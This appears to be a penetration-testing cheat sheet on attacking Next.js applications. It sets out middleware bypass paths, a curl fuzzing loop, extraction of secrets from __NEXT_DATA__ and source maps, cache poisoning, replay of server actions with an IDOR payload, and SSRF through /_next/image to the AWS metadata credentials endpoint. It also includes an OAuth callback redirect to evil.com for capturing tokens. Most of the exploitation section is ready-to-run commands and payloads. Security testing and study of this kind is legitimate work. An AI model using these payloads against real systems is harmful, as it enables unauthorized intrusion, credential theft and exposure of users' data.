# Next.js Security

*React SSR framework vulnerabilities: middleware bypass, cache poisoning, data leakage, and server actions*

---

## TL;DR

Next.js = SSR + API routes + middleware + edge runtime. Attack surfaces: middleware bypass via path normalization, `__NEXT_DATA__` leakage, cache poisoning, server actions IDOR, and source map exposure.

**Key Issues:**
- Path normalization differences bypass middleware
- `__NEXT_DATA__` in HTML leaks sensitive props
- ISR cache poisoning reveals other users' data
- Server Actions callable directly without UI flow
- Source maps expose internal logic and secrets

---

## How It Works

### Next.js Architecture

1. **Pages Router** — Traditional file-based routing (`/pages/*`)
2. **App Router** — New React Server Components (`/app/*`)
3. **API Routes** — Backend endpoints (`/pages/api/*` or `/app/api/*`)
4. **Middleware** — Edge runtime request interception
5. **Server Actions** — Server-side functions callable from client

**The Gap:** Middleware path matching uses different normalization than the router, enabling bypasses.

---

## Detection

### Fingerprinting Next.js

```bash
# Response headers
x-nextjs-cache: HIT
x-nextjs-page: /index
x-powered-by: Next.js

# HTML indicators
<script id="__NEXT_DATA__" type="application/json">
<script src="/_next/static/chunks/...js"></script>

# Common paths
/_next/static/*
/_next/data/*
/_next/image
```

### Version Detection

```javascript
// Check __BUILD_MANIFEST or package.json in source maps
// Look for Next.js version in error pages (dev mode)
```

---

## Exploitation

### 1. Middleware Bypass via Path Normalization

**How Middleware Works:**
```javascript
// middleware.ts
export function middleware(req) {
  if (req.nextUrl.pathname.startsWith('/admin')) {
    // Check auth
    if (!isAuthorized(req)) {
      return new Response('Unauthorized', { status: 401 });
    }
  }
}
```

**Bypass Techniques:**
```bash
# Original (blocked)
GET /admin/users

# Double slash
GET /admin//users

# Dot segments
GET /admin/./users
GET /admin/../admin/users

# Trailing slash
GET /admin/users/

# Path parameter
GET /admin;test/users

# URL encoding
GET /admin%2fusers
GET /%61dmin/users
```

**Testing:**
```bash
# Automated fuzzing
for path in "/admin" "/admin/" "//admin" "/./admin" "/admin/." "/admin//"; do
  curl -i "https://target.com${path}/users"
done
```

---

### 2. `__NEXT_DATA__` Leakage

**What Gets Leaked:**

Next.js injects all page props into HTML for hydration:

```html
<script id="__NEXT_DATA__" type="application/json">
{
  "props": {
    "pageProps": {
      "user": {
        "id": "123",
        "email": "admin@target.com",
        "role": "admin",
        "apiKey": "sk-live-...",  // ❌ LEAKED
        "internalId": "emp-456"   // ❌ LEAKED
      },
      "config": {
        "stripeSecret": "sk_test_..." // ❌ LEAKED
      }
    }
  }
}
</script>
```

**Attack:**
```bash
# Extract from page source
curl -s https://target.com/dashboard | \
  grep -oP '(?<=<script id="__NEXT_DATA__" type="application/json">).*?(?=</script>)' | \
  jq '.props.pageProps'
```

**Common Leaks:**
- API keys and secrets
- Internal IDs
- Admin flags
- Database records over-fetched in `getServerSideProps`

---

### 3. ISR Cache Poisoning

**How ISR Works:**

Incremental Static Regeneration caches pages. If user-specific data cached without proper cache keys:

```javascript
// Vulnerable getServerSideProps
export async function getServerSideProps(context) {
  const session = await getSession(context);
  
  return {
    props: {
      user: session.user,  // User-specific data
    },
    revalidate: 60  // Cached for 60s
  };
}
```

**Attack:**
```bash
# User A requests their profile
curl -b "session=user_a_token" https://target.com/profile
# Response cached for 60s

# User B requests profile
curl -b "session=user_b_token" https://target.com/profile
# Gets User A's data from cache!
```

**Impact:** Leakage of PII, session data, account details across users

---

### 4. Server Actions IDOR

**How Server Actions Work:**

```javascript
// app/actions.ts
'use server'

export async function deleteUser(userId) {
  // VULNERABLE: No authz check
  await db.users.delete({ where: { id: userId } });
}
```

```javascript
// Client component
import { deleteUser } from './actions';

<button onClick={() => deleteUser(user.id)}>Delete</button>
```

**Bypass the UI:**

1. Inspect Network tab → find Server Action call
2. Note the `Next-Action` header with action ID
3. Invoke directly with modified payload

```bash
POST /_next/actions HTTP/1.1
Next-Action: abc123def456
Content-Type: application/json

["VICTIM_USER_ID"]  # IDOR
```

**Impact:** Direct invocation bypasses UI-level checks

---

### 5. Source Map Exposure

**What's Exposed:**

```bash
# Download source maps
curl https://target.com/_next/static/chunks/pages/admin-123.js.map

# Contains:
# - Original source code
# - Internal file paths
# - Environment variables hardcoded
# - API endpoints
# - Server Action IDs
# - Business logic
```

**Attack:**
```bash
# Automated extraction
wget -r -l1 -nd -A "*.js.map" https://target.com/_next/static/

# Search for secrets
grep -r "API_KEY\|SECRET\|PASSWORD" *.map
```

---

### 6. Image Optimization SSRF

**Vulnerable Config:**
```javascript
// next.config.js
module.exports = {
  images: {
    domains: ['*'],  // Accept any domain
    remotePatterns: [{ hostname: '**' }]  // Same issue
  }
}
```

**Attack:**
```bash
# SSRF to AWS metadata
GET /_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF to internal services
GET /_next/image?url=http://localhost:6379/
GET /_next/image?url=http://internal-admin:8080/users
```

---

### 7. NextAuth Misconfigurations

**Common Issues:**

```javascript
// Missing PKCE
providers: [
  GoogleProvider({
    clientId: process.env.GOOGLE_ID,
    clientSecret: process.env.GOOGLE_SECRET
    // No 'checks: ["pkce"]' → CSRF risk
  })
]

// Open redirect via callbackUrl
GET /api/auth/signin?callbackUrl=https://evil.com
```

**Attack:**
```bash
# Capture OAuth tokens
https://target.com/api/auth/signin/google?callbackUrl=https://evil.com/capture
```

---

## Bypasses

### App Router vs Pages Router Inconsistency

```bash
# Auth might be implemented differently
/app/admin       → Middleware protected
/pages/admin     → Not protected? (legacy route)

# Test both
curl https://target.com/admin       # App Router
curl https://target.com/pages/admin # Pages Router
```

### Runtime Divergence

```javascript
// Edge runtime vs Node runtime
export const runtime = 'edge';  // or 'nodejs'

// Different behavior for crypto, APIs, etc.
// Test both if you can force runtime
```

### Build Manifest Mining

```javascript
// Open browser console on target site
console.log(__BUILD_MANIFEST);
console.log(__BUILD_MANIFEST.sortedPages);

// Reveals:
// - All routes (including hidden/unlisted)
// - Route groups
// - Dynamic segments
```

**Output:**
```javascript
[
  "/",
  "/admin",
  "/admin/users",
  "/admin/secret-panel",  // Not linked in UI!
  "/api/internal/debug"
]
```

---

### Flight Data Inspection

React Server Components stream data via "Flight" protocol:

```bash
# Watch Network tab for requests to:
/_next/data/*/*.json

# Inspect payloads for:
# - Sensitive props
# - Admin flags
# - Internal IDs
```

---

## Pro Tips

1. **`__BUILD_MANIFEST.sortedPages`** — Lists all routes, even hidden ones
2. **Source maps** — Always check `/_next/static/chunks/*.js.map`
3. **Path normalization** — `/api//admin` is the most common bypass
4. **Server Action IDs** — Captured in `Next-Action` header; replayable
5. **Staging over-fetching** — Dev/staging often fetches more props than production
6. **Cache keys** — Check if user-specific data has proper Vary headers

---

## Rapid Recon

```bash
# Enumerate endpoints
curl https://target.com/sitemap.xml
curl https://target.com/robots.txt
curl https://target.com/_next/data/BUILD_ID/index.json

# Check for exposed docs
curl https://target.com/__nextjs_original-stack-frame

# Extract build manifest
curl https://target.com/_next/static/chunks/pages/_app.js | \
  grep -oP '__BUILD_MANIFEST=.*?;'

# Download source maps
wget -r -l1 -nd -A "*.js.map" https://target.com/_next/static/
```

---

## Validation

Prove vulnerabilities with:

1. ✅ Middleware bypass via path normalization (e.g., `/admin//users`)
2. ✅ `__NEXT_DATA__` contains API keys or sensitive user data
3. ✅ Source maps expose internal code and secrets
4. ✅ ISR cache returns another user's data
5. ✅ Server Action invoked directly with IDOR payload
6. ✅ Image optimization SSRF to internal endpoint

---

## References

- [Next.js Security Headers](https://nextjs.org/docs/app/building-your-application/configuring/security-headers)
- [Vercel Security Advisories](https://github.com/vercel/next.js/security/advisories)
- [Next.js Middleware](https://nextjs.org/docs/app/building-your-application/routing/middleware)
- [Server Actions Security](https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions-and-mutations)
- [React Server Components](https://react.dev/blog/2023/03/22/react-labs-what-we-have-been-working-on-march-2023#react-server-components)
